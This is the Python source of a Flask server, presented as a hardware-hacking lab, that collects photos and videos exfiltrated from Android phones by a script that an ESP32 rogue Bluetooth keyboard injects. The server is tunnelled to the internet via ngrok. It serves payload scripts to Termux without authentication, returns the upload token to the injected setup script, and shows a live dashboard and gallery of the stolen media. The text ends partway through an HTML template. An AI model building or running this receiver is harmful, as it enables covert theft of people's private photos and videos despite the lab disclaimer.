#!/usr/bin/env python3
"""
server.py — ESP32 BLE HID Lab — Media Exfiltration Receiver
=============================================================
CTF / Hardware Hacking Lab — Authorized Devices Only.

Receives media files exfiltrated from an Android device by media_backup.py
running in Termux, triggered by an ESP32 acting as a rogue BLE HID keyboard.
Exposed to the internet via ngrok HTTPS tunnel.
Runs on macOS, Linux, and Windows (Python 3.8+).

USE ONLY ON DEVICES YOU OWN OR HAVE EXPLICIT WRITTEN AUTHORIZATION TO TEST.

HOW TO START (two terminal windows):
  Window 1:  ngrok http 8019
  Window 2:  cd fetch_photos/server
             python3 server.py          # macOS / Linux
             python  server.py          # Windows

Configuration (environment variables or .env file):
  UPLOAD_TOKEN   Required auth token that the Android client must send in the
                 X-Backup-Token header.

                 macOS / Linux:
                     export UPLOAD_TOKEN="your_long_random_secret"
                 Windows (cmd):
                     set UPLOAD_TOKEN=your_long_random_secret
                 Windows (PowerShell):
                     $env:UPLOAD_TOKEN="your_long_random_secret"

                 Or create a .env file (copy from .env.example):
                     echo UPLOAD_TOKEN=your_long_random_secret > .env

  BACKUP_DIR     Root directory where received files are stored.
                 Defaults to  ./Android_Media_Backup  next to this script.

API endpoints:
  GET  /health              Liveness probe — returns {"status":"ok"}
  GET  /dashboard           Web control dashboard (all 6 panels)
  GET  /api/stats           Live JSON stats for dashboard polling
  POST /upload              Receive a media file from the Android client
  GET  /files               HTML gallery + file listing
  GET  /download/<file_id>  Download a specific file by its stored name
  GET  /report              JSON acquisition report
  GET  /payloads/<filename> Serve Android client scripts to Termux (no auth)
"""

import os
import re
import sys
import csv
import json
import uuid
import hmac
import time
import hashlib
import logging
import urllib.request
from pathlib import Path
from datetime import datetime
from collections import deque
from functools import wraps

from flask import (
    Flask, request, jsonify,
    send_from_directory, send_file,
    render_template_string, abort
)

# ── Configuration ─────────────────────────────────────────────────────────────

_BASE_DIR    = Path(__file__).resolve().parent
_DOTENV      = _BASE_DIR / ".env"

# Load .env file if present (simple KEY=VALUE parser, no dependency needed)
if _DOTENV.exists():
    with open(_DOTENV) as _f:
        for _line in _f:
            _line = _line.strip()
            if _line and not _line.startswith("#") and "=" in _line:
                _k, _, _v = _line.partition("=")
                os.environ.setdefault(_k.strip(), _v.strip())

UPLOAD_TOKEN  = os.environ.get("UPLOAD_TOKEN", "")
SETUP_PASSWORD = os.environ.get("SETUP_PASSWORD", "")   # protects GET /setup-token
BACKUP_DIR    = Path(os.environ.get("BACKUP_DIR", str(_BASE_DIR / "Android_Media_Backup")))
PAYLOAD_DIR   = _BASE_DIR / "payloads"
LOG_FILE      = BACKUP_DIR / "Reports" / "transfer.log"
MANIFEST_FILE = BACKUP_DIR / "Reports" / "sha256_manifest.txt"
REPORT_CSV    = BACKUP_DIR / "Reports" / "acquisition_report.csv"
REPORT_JSON   = BACKUP_DIR / "Reports" / "acquisition_report.json"
PORT          = 8019
MAX_FILE_MB   = 500

# Allowed media extensions
MEDIA_EXTS = {
    ".jpg", ".jpeg", ".png", ".webp", ".heic", ".gif",
    ".bmp", ".tiff", ".tif", ".dng", ".raw",
    ".mp4", ".mov", ".avi", ".mkv", ".3gp", ".m4v", ".webm", ".ts",
}

# Category → subdirectory mapping
CATEGORY_DIRS = {
    "DCIM":        "DCIM",
    "Pictures":    "Pictures",
    "Screenshots": "Screenshots",
    "Movies":      "Movies",
    "Downloads":   "Downloads",
    "Other":       "Other",
}

# ── Directory setup ───────────────────────────────────────────────────────────

for _subdir in list(CATEGORY_DIRS.values()) + ["Reports"]:
    (BACKUP_DIR / _subdir).mkdir(parents=True, exist_ok=True)
PAYLOAD_DIR.mkdir(parents=True, exist_ok=True)

# ── Logging ───────────────────────────────────────────────────────────────────

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s  %(levelname)-7s  %(message)s",
    datefmt="%Y-%m-%d %H:%M:%S",
    handlers=[
        logging.StreamHandler(),
        logging.FileHandler(str(LOG_FILE), encoding="utf-8"),
    ],
)
log = logging.getLogger("server")

# ── Flask app ─────────────────────────────────────────────────────────────────

app = Flask(__name__)
app.config["MAX_CONTENT_LENGTH"] = (MAX_FILE_MB + 10) * 1024 * 1024

# ── In-memory duplicate index: sha256 → stored filename ──────────────────────
# Populated at startup from the manifest file, updated on every upload.

_sha_index: dict[str, str] = {}

# ── Live telemetry ─────────────────────────────────────────────────────────────
# Lightweight in-process stats used by /api/stats — no DB required.

_server_start   = time.time()

# Upload history ring buffer — last 200 events
# Each entry: {ts, filename, category, size_bytes, ok, error}
_upload_events: deque = deque(maxlen=200)

# Per-session speed tracking: bytes uploaded in the last 60 s (sliding window)
# Each entry: (timestamp_float, bytes_int)
_speed_window: deque = deque(maxlen=2000)

# Error counter
_error_count: int = 0

# Connected device tracking: ip → {first_seen, last_seen, files, bytes, errors}
_devices: dict = {}

def _record_upload(filename, category, size_bytes, ok, error="", remote_ip=""):
    """Record one upload event into the telemetry buffers."""
    global _error_count
    now = time.time()
    _upload_events.appendleft({
        "ts":         datetime.fromtimestamp(now).strftime("%H:%M:%S"),
        "ts_epoch":   now,
        "filename":   filename,
        "category":   category,
        "size_bytes": size_bytes,
        "size_kb":    size_bytes // 1024,
        "ok":         ok,
        "error":      error,
        "ip":         remote_ip,
    })
    if ok:
        _speed_window.append((now, size_bytes))
    else:
        _error_count += 1
    # Update device record
    if remote_ip:
        d = _devices.setdefault(remote_ip, {
            "ip": remote_ip, "first_seen": datetime.fromtimestamp(now).isoformat(),
            "files": 0, "bytes": 0, "errors": 0, "last_seen": "",
        })
        d["last_seen"] = datetime.fromtimestamp(now).isoformat()
        if ok:
            d["files"] += 1
            d["bytes"] += size_bytes
        else:
            d["errors"] += 1

def _current_speed_kbps() -> float:
    """Bytes uploaded in the last 10 s → KB/s."""
    cutoff = time.time() - 10
    total  = sum(b for ts, b in _speed_window if ts >= cutoff)
    return round(total / 1024 / 10, 1)

def _load_manifest():
    """Load SHA-256 → filename index from the manifest file."""
    if not MANIFEST_FILE.exists():
        return
    with open(MANIFEST_FILE, encoding="utf-8") as fh:
        for line in fh:
            line = line.strip()
            if not line or line.startswith("#"):
                continue
            parts = line.split(None, 1)
            if len(parts) == 2:
                _sha_index[parts[0]] = parts[1]

def _append_manifest(sha256, filename):
    """Append one entry to the manifest file and update the in-memory index."""
    _sha_index[sha256] = filename
    with open(MANIFEST_FILE, "a", encoding="utf-8") as fh:
        fh.write(f"{sha256}  {filename}\n")

_load_manifest()
log.info("Manifest loaded — %d known files.", len(_sha_index))

# ── CSV report helper ─────────────────────────────────────────────────────────

def _append_csv(row: dict):
    new_file = not REPORT_CSV.exists()
    with open(REPORT_CSV, "a", newline="", encoding="utf-8") as fh:
        w = csv.DictWriter(fh, fieldnames=[
            "timestamp", "original_name", "saved_name",
            "category", "size_bytes", "sha256", "client_mtime",
        ])
        if new_file:
            w.writeheader()
        w.writerow(row)

# ── Helpers ───────────────────────────────────────────────────────────────────

def _safe_filename(name: str) -> str:
    """
    Sanitise an arbitrary filename so it cannot escape BACKUP_DIR.
    Keeps alphanumerics, dots, hyphens, underscores.  Collapses everything
    else to underscores.  Strips leading dots to prevent hidden files.
    """
    name  = os.path.basename(name)   # strip any directory component
    name  = re.sub(r"[^\w.\-]", "_", name)
    name  = name.lstrip(".")
    return name or "file"

def _resolve_category(raw: str) -> str:
    return CATEGORY_DIRS.get(raw.strip(), "Other")

def _sha256_file(path: Path) -> str:
    h = hashlib.sha256()
    with open(path, "rb") as fh:
        for chunk in iter(lambda: fh.read(1 << 20), b""):
            h.update(chunk)
    return h.hexdigest()

# ── Auth decorator ────────────────────────────────────────────────────────────

def require_token(fn):
    """
    Reject requests that do not carry the correct X-Backup-Token header.
    Skipped entirely if UPLOAD_TOKEN is empty (development convenience).
    Uses constant-time comparison to prevent timing attacks.
    """
    @wraps(fn)
    def wrapper(*args, **kwargs):
        if UPLOAD_TOKEN:
            provided = request.headers.get("X-Backup-Token", "")
            if not hmac.compare_digest(provided, UPLOAD_TOKEN):
                log.warning("Auth failure from %s", request.remote_addr)
                return jsonify({"ok": False, "error": "Unauthorized"}), 401
        return fn(*args, **kwargs)
    return wrapper

# ── Endpoints ─────────────────────────────────────────────────────────────────

# GET /health ─────────────────────────────────────────────────────────────────
@app.route("/health", methods=["GET"])
def health():
    """Liveness probe — no auth required."""
    total  = sum(1 for _ in BACKUP_DIR.rglob("*") if _.is_file() and _.parent.name != "Reports")
    return jsonify({"status": "ok", "files": total, "max_file_mb": MAX_FILE_MB}), 200


# GET /setup-token ─────────────────────────────────────────────────────────────
@app.route("/setup-token", methods=["GET"])
def setup_token():
    """
    Return the UPLOAD_TOKEN as plain text so the ESP32-injected setup script
    can save it to ~/.backup_token on the Android device automatically.

    Protected by X-Setup-Password header (SETUP_PASSWORD in .env).
    If SETUP_PASSWORD is not set this endpoint is disabled entirely.

    The ESP32 firmware embeds SETUP_PASSWORD at flash time (not over the air),
    so the password is never transmitted beyond the BLE keyboard channel.
    """
    if not SETUP_PASSWORD:
        # Disabled — operator must set SETUP_PASSWORD in .env to use this endpoint
        return ("setup-token endpoint is disabled. Set SETUP_PASSWORD in .env to enable.", 403)

    provided = request.headers.get("X-Setup-Password", "")
    if not hmac.compare_digest(provided, SETUP_PASSWORD):
        log.warning("setup-token auth failure from %s", request.remote_addr)
        return ("Unauthorized", 401)

    if not UPLOAD_TOKEN:
        return ("UPLOAD_TOKEN is not configured on this server.", 503)

    log.info("setup-token served to %s", request.remote_addr)
    # Return as plain text — curl can pipe straight to a file
    return (UPLOAD_TOKEN, 200, {"Content-Type": "text/plain; charset=utf-8"})


# POST /upload ────────────────────────────────────────────────────────────────
@app.route("/upload", methods=["POST"])
@require_token
def upload():
    """
    Receive a media file from the Android client.

    Expected multipart/form-data fields:
        file      : binary file data (required)
        sha256    : hex SHA-256 of the original file (required)
        category  : DCIM | Pictures | Screenshots | Movies | Downloads | Other
        mtime     : ISO-8601 original modification time (optional)
    """
    # ── Validate required fields ──────────────────────────────────────────
    if "file" not in request.files:
        return jsonify({"ok": False, "error": "Missing 'file' field"}), 400

    f = request.files["file"]
    if not f.filename:
        return jsonify({"ok": False, "error": "Empty filename"}), 400

    client_sha = request.form.get("sha256", "").strip().lower()
    if not re.fullmatch(r"[0-9a-f]{64}", client_sha):
        return jsonify({"ok": False, "error": "Missing or invalid sha256 field"}), 400

    # ── File type validation ──────────────────────────────────────────────
    ext = Path(f.filename).suffix.lower()
    if ext not in MEDIA_EXTS:
        return jsonify({"ok": False, "error": f"Unsupported extension: {ext}"}), 415

    # Duplicate detection is disabled — every upload is accepted.
    # To re-enable, uncomment these four lines:
    # if client_sha in _sha_index:
    #     existing = _sha_index[client_sha]
    #     log.debug("Duplicate skipped: %s", f.filename)
    #     return jsonify({"ok": True, "duplicate": True, "saved": existing}), 409

    # ── Build safe destination path ───────────────────────────────────────
    raw_category = request.form.get("category", "Other")
    subdir       = _resolve_category(raw_category)
    safe_name    = _safe_filename(f.filename)
    timestamp    = datetime.now().strftime("%Y%m%d_%H%M%S")
    unique_id    = uuid.uuid4().hex[:8]
    stored_name  = f"{timestamp}_{unique_id}_{safe_name}"
    dest_path    = BACKUP_DIR / subdir / stored_name

    # ── Save file ─────────────────────────────────────────────────────────
    f.save(str(dest_path))
    size_bytes = dest_path.stat().st_size

    # ── File size post-save validation ────────────────────────────────────
    if size_bytes > MAX_FILE_MB * 1024 * 1024:
        dest_path.unlink(missing_ok=True)
        return jsonify({"ok": False, "error": f"File exceeds {MAX_FILE_MB} MB limit"}), 413

    # ── Server-side SHA-256 verification ──────────────────────────────────
    server_sha = _sha256_file(dest_path)
    if server_sha != client_sha:
        dest_path.unlink(missing_ok=True)
        log.error("SHA-256 mismatch for %s: client=%s server=%s",
                  f.filename, client_sha, server_sha)
        return jsonify({
            "ok": False,
            "error": "SHA-256 mismatch — file may be corrupted in transit",
            "client_sha": client_sha,
            "server_sha": server_sha,
        }), 422

    # ── Update manifest and CSV report ────────────────────────────────────
    _append_manifest(server_sha, stored_name)
    _append_csv({
        "timestamp":     timestamp,
        "original_name": safe_name,
        "saved_name":    stored_name,
        "category":      subdir,
        "size_bytes":    size_bytes,
        "sha256":        server_sha,
        "client_mtime":  request.form.get("mtime", ""),
    })

    log.info("OK  %s  →  %s/%s  (%d KB)",
             f.filename, subdir, stored_name, size_bytes // 1024)

    _record_upload(safe_name, subdir, size_bytes, ok=True,
                   remote_ip=request.remote_addr)

    return jsonify({
        "ok":       True,
        "saved":    stored_name,
        "category": subdir,
        "size_kb":  size_bytes // 1024,
        "sha256":   server_sha,
        "file_id":  stored_name,
    }), 200


# GET /files ──────────────────────────────────────────────────────────────────
@app.route("/files", methods=["GET"])
def files_gallery():
    """HTML gallery of all received files, grouped by category."""
    groups = {}
    for subdir in CATEGORY_DIRS.values():
        d = BACKUP_DIR / subdir
        if not d.exists():
            continue
        entries = sorted(d.iterdir(), key=lambda p: p.stat().st_mtime, reverse=True)
        items   = [p.name for p in entries if p.is_file()]
        if items:
            groups[subdir] = items

    total = sum(len(v) for v in groups.values())
    total_mb = sum(
        (BACKUP_DIR / cat / fname).stat().st_size
        for cat, fnames in groups.items()
        for fname in fnames
    ) / 1_048_576

    return render_template_string(GALLERY_HTML, groups=groups,
                                  total=total, total_mb=round(total_mb, 1))


# GET /download/<file_id> ─────────────────────────────────────────────────────
@app.route("/download/<path:file_id>", methods=["GET"])
def download_file(file_id):
    """
    Serve a file for download.
    file_id  is  <category>/<stored_name>  or just  <stored_name>.
    Directory traversal is prevented by resolving the final path and
    confirming it is inside BACKUP_DIR.
    """
    # Sanitise — reject anything that looks like a path traversal attempt
    if ".." in file_id or file_id.startswith("/"):
        abort(400)

    # Try category/name form first, then search all category dirs
    candidate = BACKUP_DIR / file_id
    if not candidate.exists() or not candidate.is_file():
        # Search in category subdirs
        name = Path(file_id).name
        found = None
        for subdir in CATEGORY_DIRS.values():
            p = BACKUP_DIR / subdir / name
            if p.exists() and p.is_file():
                found = p
                break
        if not found:
            abort(404)
        candidate = found

    # Confirm the resolved path is inside BACKUP_DIR (defence in depth)
    try:
        candidate.resolve().relative_to(BACKUP_DIR.resolve())
    except ValueError:
        abort(403)

    return send_from_directory(str(candidate.parent), candidate.name, as_attachment=True)


# GET /report ─────────────────────────────────────────────────────────────────
@app.route("/report", methods=["GET"])
def report():
    """JSON acquisition report — counts, sizes, last activity per category."""
    result = {"generated": datetime.now().isoformat(), "categories": {}, "totals": {}}
    grand_count = 0
    grand_bytes = 0

    for subdir in CATEGORY_DIRS.values():
        d = BACKUP_DIR / subdir
        if not d.exists():
            result["categories"][subdir] = {"count": 0, "size_mb": 0}
            continue
        files = [p for p in d.iterdir() if p.is_file()]
        size  = sum(p.stat().st_size for p in files)
        last  = max((p.stat().st_mtime for p in files), default=0)
        result["categories"][subdir] = {
            "count":   len(files),
            "size_mb": round(size / 1_048_576, 2),
            "last_upload": datetime.fromtimestamp(last).isoformat() if last else None,
        }
        grand_count += len(files)
        grand_bytes += size

    result["totals"] = {
        "files":    grand_count,
        "size_mb":  round(grand_bytes / 1_048_576, 2),
        "known_hashes": len(_sha_index),
    }

    # Persist JSON report
    with open(REPORT_JSON, "w", encoding="utf-8") as fh:
        json.dump(result, fh, indent=2)

    return jsonify(result), 200


# GET /api/stats ──────────────────────────────────────────────────────────────
@app.route("/api/stats", methods=["GET"])
def api_stats():
    """Live JSON stats polled by the dashboard every 3 s."""
    # Storage utilization
    total_bytes = 0
    cat_stats   = {}
    for subdir in CATEGORY_DIRS.values():
        d = BACKUP_DIR / subdir
        if not d.exists():
            cat_stats[subdir] = {"count": 0, "size_mb": 0}
            continue
        files = [p for p in d.iterdir() if p.is_file()]
        sb    = sum(p.stat().st_size for p in files)
        total_bytes += sb
        cat_stats[subdir] = {"count": len(files), "size_mb": round(sb / 1_048_576, 2)}

    uptime_s = int(time.time() - _server_start)
    h, rem   = divmod(uptime_s, 3600)
    m, s     = divmod(rem, 60)

    return jsonify({
        "uptime":       f"{h:02d}:{m:02d}:{s:02d}",
        "total_files":  sum(v["count"] for v in cat_stats.values()),
        "total_mb":     round(total_bytes / 1_048_576, 2),
        "speed_kbps":   _current_speed_kbps(),
        "error_count":  _error_count,
        "known_hashes": len(_sha_index),
        "categories":   cat_stats,
        "devices":      list(_devices.values()),
        "history":      list(_upload_events)[:50],   # last 50 for the table
    }), 200


# GET /dashboard ──────────────────────────────────────────────────────────────
@app.route("/dashboard", methods=["GET"])
def dashboard():
    """Full web control dashboard."""
    return render_template_string(DASHBOARD_HTML)


# GET /payloads/<filename> ────────────────────────────────────────────────────
@app.route("/payloads/<filename>", methods=["GET"])
def serve_payload(filename):
    """Serve Python client scripts to Termux — no auth required."""
    safe = _safe_filename(filename)
    if safe != filename:
        abort(400)
    log.info("Payload request: %s", filename)
    return send_from_directory(str(PAYLOAD_DIR), filename, as_attachment=False)


# ── Dashboard HTML ────────────────────────────────────────────────────────────

DASHBOARD_HTML = """<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>ESP32 Lab — Dashboard</title>
<style>
*{box-sizing:border-box;margin:0;padding:0}
body{font-family:-apple-system,"Segoe UI",system-ui,sans-serif;background:#0f1117;color:#e2e8f0;min-height:100vh}
a{color:#60a5fa;text-decoration:none}
/* ── top bar ── */
.topbar{display:flex;align-items:center;gap:12px;padding:14px 24px;background:#1a1d27;border-bottom:1px solid #2d3148}
.topbar h1{font-size:1rem;font-weight:600;letter-spacing:.03em;color:#f1f5f9}
.topbar .sub{font-size:.75rem;color:#64748b;margin-left:4px}
.dot{width:8px;height:8px;border-radius:50%;background:#22c55e;margin-left:auto;animation:pulse 2s infinite}
@keyframes pulse{0%,100%{opacity:1}50%{opacity:.4}}
.uptime{font-size:.75rem;color:#64748b}
/* ── layout ── */
.wrap{display:grid;grid-template-columns:repeat(auto-fill,minmax(300px,1fr));gap:16px;padding:20px 24px}
.card{background:#1a1d27;border:1px solid #2d3148;border-radius:10px;padding:18px}
.card h2{font-size:.8rem;font-weight:600;color:#94a3b8;text-transform:uppercase;letter-spacing:.06em;margin-bottom:14px}
/* ── stat row ── */
.stats{display:grid;grid-template-columns:1fr 1fr;gap:10px;margin-bottom:0}
.stat{background:#0f1117;border-radius:8px;padding:12px 14px}
.stat .val{font-size:1.6rem;font-weight:700;color:#f1f5f9;line-height:1}
.stat .lbl{font-size:.72rem;color:#64748b;margin-top:4px}
.stat.ok .val{color:#22c55e}
.stat.warn .val{color:#f59e0b}
.stat.err .val{color:#f87171}
/* ── speed bar ── */
.speed-wrap{margin-top:4px}
.speed-bar{height:6px;border-radius:3px;background:#22c55e;transition:width .5s ease;max-width:100%}
.speed-lbl{font-size:.72rem;color:#64748b;margin-top:4px}
/* ── category bars ── */
.cat-row{display:flex;align-items:center;gap:8px;margin-bottom:8px}
.cat-name{font-size:.78rem;color:#94a3b8;width:90px;flex-shrink:0}
.cat-bar-wrap{flex:1;background:#0f1117;border-radius:3px;height:8px;overflow:hidden}
.cat-bar{height:8px;border-radius:3px;background:#3b82f6;transition:width .4s ease}
.cat-count{font-size:.72rem;color:#64748b;width:48px;text-align:right;flex-shrink:0}
/* ── history table ── */
.htable-wrap{overflow-x:auto;max-height:260px;overflow-y:auto}
table{width:100%;border-collapse:collapse;font-size:.75rem}
th{color:#64748b;text-align:left;padding:4px 8px;border-bottom:1px solid #2d3148;position:sticky;top:0;background:#1a1d27;font-weight:500}
td{padding:5px 8px;border-bottom:1px solid #1e2235;color:#cbd5e1;white-space:nowrap}
td.ok{color:#22c55e}
td.fail{color:#f87171}
tr:hover td{background:#20243a}
/* ── device list ── */
.dev-row{display:flex;align-items:center;gap:10px;padding:8px 0;border-bottom:1px solid #1e2235}
.dev-row:last-child{border-bottom:none}
.dev-ip{font-size:.8rem;color:#f1f5f9;font-weight:500;min-width:120px}
.dev-meta{font-size:.72rem;color:#64748b}
.dev-badge{background:#1e3a5f;color:#60a5fa;border-radius:12px;padding:2px 8px;font-size:.7rem}
/* ── error log ── */
.err-list{max-height:180px;overflow-y:auto}
.err-item{padding:6px 0;border-bottom:1px solid #1e2235;font-size:.75rem}
.err-item:last-child{border-bottom:none}
.err-item .et{color:#f87171;font-weight:500}
.err-item .ef{color:#94a3b8}
.err-item .em{color:#64748b}
.no-data{color:#64748b;font-size:.8rem;padding:12px 0;text-align:center}
/* ── nav links ── */
.nav{display:flex;gap:10px;flex-wrap:wrap;margin-top:14px}
.nav a{font-size:.78rem;padding:5px 12px;border-radius:5px;background:#1e2235;color:#94a3b8;border:1px solid #2d3148;transition:background .15s}
.nav a:hover{background:#2d3148;color:#f1f5f9}
</style>
</head>
<body>

<div class="topbar">
  <h1>ESP32 BLE HID Lab</h1>
  <span class="sub">Control Dashboard</span>
  <span class="dot" id="dot"></span>
  <span class="uptime" id="uptime">--:--:--</span>
</div>

<div class="wrap">

  <!-- ── 1. Server Status ───────────────────────────── -->
  <div class="card">
    <h2>Server Status</h2>
    <div class="stats">
      <div class="stat ok">
        <div class="val" id="s-files">—</div>
        <div class="lbl">Total Files</div>
      </div>
      <div class="stat">
        <div class="val" id="s-mb">—</div>
        <div class="lbl">Total MB</div>
      </div>
      <div class="stat">
        <div class="val" id="s-hashes">—</div>
        <div class="lbl">Unique Hashes</div>
      </div>
      <div class="stat" id="s-err-card">
        <div class="val" id="s-errors">—</div>
        <div class="lbl">Errors</div>
      </div>
    </div>
    <div class="nav">
      <a href="/files">Gallery</a>
      <a href="/report">JSON Report</a>
      <a href="/health">Health</a>
    </div>
  </div>

  <!-- ── 2. Upload Speed ────────────────────────────── -->
  <div class="card">
    <h2>Upload Speed</h2>
    <div class="stat ok" style="margin-bottom:12px">
      <div class="val" id="s-speed">0</div>
      <div class="lbl">KB/s (last 10 s)</div>
    </div>
    <div class="speed-wrap">
      <div class="speed-bar" id="speed-bar" style="width:0%"></div>
      <div class="speed-lbl" id="speed-lbl">Idle</div>
    </div>
    <div style="margin-top:16px">
      <div id="speed-history" style="display:flex;gap:3px;align-items:flex-end;height:40px"></div>
      <div style="font-size:.7rem;color:#64748b;margin-top:4px">Speed sparkline (last 20 polls)</div>
    </div>
  </div>

  <!-- ── 3. Storage Utilization ────────────────────── -->
  <div class="card">
    <h2>Storage Utilization</h2>
    <div id="cat-bars"></div>
  </div>

  <!-- ── 4. Connected Devices ──────────────────────── -->
  <div class="card">
    <h2>Connected Devices</h2>
    <div id="dev-list"><p class="no-data">No uploads received yet.</p></div>
  </div>

  <!-- ── 5. Upload History ──────────────────────────── -->
  <div class="card" style="grid-column:span 2">
    <h2>Backup History <span id="hist-count" style="color:#64748b;font-weight:400"></span></h2>
    <div class="htable-wrap">
      <table>
        <thead><tr>
          <th>Time</th><th>File</th><th>Category</th><th>Size (KB)</th><th>IP</th><th>Status</th>
        </tr></thead>
        <tbody id="hist-body"><tr><td colspan="6" style="text-align:center;color:#64748b;padding:16px">No uploads yet.</td></tr></tbody>
      </table>
    </div>
  </div>

  <!-- ── 6. Error Monitoring ───────────────────────── -->
  <div class="card">
    <h2>Error Monitoring <span id="err-badge" style="color:#f87171;font-weight:400"></span></h2>
    <div class="err-list" id="err-list"><p class="no-data">No errors.</p></div>
  </div>

</div>

<script>
const CAT_COLORS = {DCIM:'#3b82f6',Pictures:'#8b5cf6',Screenshots:'#06b6d4',Movies:'#f59e0b',Downloads:'#10b981',Other:'#64748b'};
let _speedHistory = [];
let _maxSpeed = 1;

async function poll() {
  try {
    const r = await fetch('/api/stats');
    if (!r.ok) throw new Error(r.status);
    const d = await r.json();
    update(d);
    document.getElementById('dot').style.background = '#22c55e';
  } catch(e) {
    document.getElementById('dot').style.background = '#f87171';
  }
}

function fmt(n){ return n >= 1000 ? (n/1000).toFixed(1)+'G' : n >= 100 ? n+'' : n+''; }

function update(d) {
  // ── top bar
  document.getElementById('uptime').textContent = d.uptime;

  // ── server status
  document.getElementById('s-files').textContent   = d.total_files;
  document.getElementById('s-mb').textContent      = d.total_mb;
  document.getElementById('s-hashes').textContent  = d.known_hashes;
  document.getElementById('s-errors').textContent  = d.error_count;
  const ec = document.getElementById('s-err-card');
  ec.className = 'stat ' + (d.error_count > 0 ? 'err' : 'ok');

  // ── speed
  const sp = d.speed_kbps;
  document.getElementById('s-speed').textContent = sp;
  _maxSpeed = Math.max(_maxSpeed, sp, 1);
  const pct = Math.min(100, (sp / _maxSpeed) * 100);
  document.getElementById('speed-bar').style.width = pct + '%';
  document.getElementById('speed-bar').style.background = sp > 500 ? '#22c55e' : sp > 100 ? '#f59e0b' : '#3b82f6';
  document.getElementById('speed-lbl').textContent = sp > 0 ? sp + ' KB/s uploading' : 'Idle';

  // sparkline
  _speedHistory.push(sp);
  if (_speedHistory.length > 20) _speedHistory.shift();
  const maxS = Math.max(..._speedHistory, 1);
  const sh = document.getElementById('speed-history');
  sh.innerHTML = _speedHistory.map(v => {
    const h = Math.max(2, Math.round((v / maxS) * 38));
    const c = v > 500 ? '#22c55e' : v > 100 ? '#f59e0b' : '#3b82f6';
    return '<div style="width:8px;height:'+h+'px;background:'+c+';border-radius:2px;flex-shrink:0"></div>';
  }).join('');

  // ── storage / category bars
  const cats = d.categories;
  const maxCat = Math.max(...Object.values(cats).map(c => c.size_mb), 1);
  document.getElementById('cat-bars').innerHTML = Object.entries(cats).map(([name, c]) => {
    const pct = Math.min(100, (c.size_mb / maxCat) * 100);
    const col = CAT_COLORS[name] || '#64748b';
    return '<div class="cat-row">' +
      '<span class="cat-name">' + name + '</span>' +
      '<div class="cat-bar-wrap"><div class="cat-bar" style="width:' + pct + '%;background:' + col + '"></div></div>' +
      '<span class="cat-count">' + c.count + ' / ' + c.size_mb + ' MB</span>' +
    '</div>';
  }).join('');

  // ── devices
  const devEl = document.getElementById('dev-list');
  if (!d.devices || d.devices.length === 0) {
    devEl.innerHTML = '<p class="no-data">No uploads received yet.</p>';
  } else {
    devEl.innerHTML = d.devices.map(dv => {
      const mb = (dv.bytes / 1_048_576).toFixed(1);
      return '<div class="dev-row">' +
        '<span class="dev-ip">' + dv.ip + '</span>' +
        '<span class="dev-badge">' + dv.files + ' files</span>' +
        '<span class="dev-meta">' + mb + ' MB · ' + (dv.errors > 0 ? '<span style="color:#f87171">'+dv.errors+' err</span>' : '0 err') + '</span>' +
        '<span class="dev-meta" style="margin-left:auto;font-size:.7rem">' + (dv.last_seen||'').slice(11,19) + '</span>' +
      '</div>';
    }).join('');
  }

  // ── history table
  const hist = d.history || [];
  document.getElementById('hist-count').textContent = hist.length ? '(' + hist.length + ')' : '';
  const tbody = document.getElementById('hist-body');
  if (hist.length === 0) {
    tbody.innerHTML = '<tr><td colspan="6" style="text-align:center;color:#64748b;padding:16px">No uploads yet.</td></tr>';
  } else {
    tbody.innerHTML = hist.map(h => {
      const st = h.ok ? '<td class="ok">OK</td>' : '<td class="fail">FAIL</td>';
      return '<tr><td>'+h.ts+'</td><td title="'+h.filename+'">'+h.filename.slice(0,28)+(h.filename.length>28?'…':'')+'</td><td>'+h.category+'</td><td>'+h.size_kb+'</td><td>'+h.ip+'</td>'+st+'</tr>';
    }).join('');
  }

  // ── errors
  const errors = (d.history || []).filter(h => !h.ok);
  const errBadge = document.getElementById('err-badge');
  errBadge.textContent = errors.length ? '(' + errors.length + ')' : '';
  const errEl = document.getElementById('err-list');
  if (errors.length === 0) {
    errEl.innerHTML = '<p class="no-data">No errors.</p>';
  } else {
    errEl.innerHTML = errors.map(e =>
      '<div class="err-item">' +
        '<span class="et">' + e.ts + '</span> ' +
        '<span class="ef">' + e.filename + '</span> ' +
        '<span class="em">' + (e.error || 'unknown error') + '</span>' +
      '</div>'
    ).join('');
  }
}

poll();
setInterval(poll, 3000);
</script>
</body>
</html>"""

# ── Gallery HTML template ─────────────────────────────────────────────────────

GALLERY_HTML = """
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Android Media Backup</title>
<style>
  *{box-sizing:border-box;margin:0;padding:0}
  body{font-family:-apple-system,"Segoe UI",system-ui,sans-serif;
       background:#f7f8fa;color:#1f2328;padding:24px 32px}
  h1{font-size:1.3rem;margin-bottom:4px}
  .sub{font-size:.85rem;color:#57606a;margin-bottom:20px}
  .bar{display:flex;gap:12px;margin-bottom:28px;flex-wrap:wrap;align-items:center}
  .badge{background:#e5e7eb;border-radius:20px;padding:4px 12px;font-size:.8rem;color:#57606a}
  .btn{display:inline-block;padding:8px 16px;border-radius:6px;font-size:.85rem;
       font-weight:600;text-decoration:none;color:#fff;background:#3b82d4}
  h2{font-size:1rem;margin:24px 0 10px;border-bottom:1px solid #e5e7eb;padding-bottom:6px}
  .grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(190px,1fr));gap:10px}
  .card{background:#fff;border:1px solid #e5e7eb;border-radius:8px;overflow:hidden}
  .card img{width:100%;height:140px;object-fit:cover;display:block;background:#f0f0f0}
  .card video{width:100%;height:140px;object-fit:cover;display:block;background:#111}
  .card .meta{padding:6px 10px;font-size:.72rem;color:#57606a;
              white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
  .card a.dl{display:block;font-size:.75rem;padding:0 10px 8px;
             color:#3b82d4;text-decoration:none}
  .empty{color:#57606a;font-size:.9rem;margin-top:40px;text-align:center}
  .refresh{font-size:.75rem;color:#57606a;margin-left:auto}
</style>
</head>
<body>
  <h1>Android Media Backup</h1>
  <p class="sub">ESP32 BLE HID · Termux · ngrok · cross-platform receiver</p>
  <div class="bar">
    <span class="badge">{{ total }} files</span>
    <span class="badge">{{ total_mb }} MB</span>
    <a class="btn" href="/report">Report (JSON)</a>
    <span class="refresh">Auto-refreshes every 15 s</span>
  </div>

  {% if groups %}
